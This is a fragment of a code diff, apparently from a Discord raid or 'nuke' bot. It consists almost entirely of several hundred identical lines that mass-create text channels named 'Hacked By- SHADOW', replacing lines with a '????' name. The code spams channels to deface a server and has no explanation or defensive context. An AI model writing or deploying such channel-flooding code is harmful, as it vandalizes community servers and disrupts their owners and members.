-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-m.createChannel('Hacked By- ????', 'text');
-
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
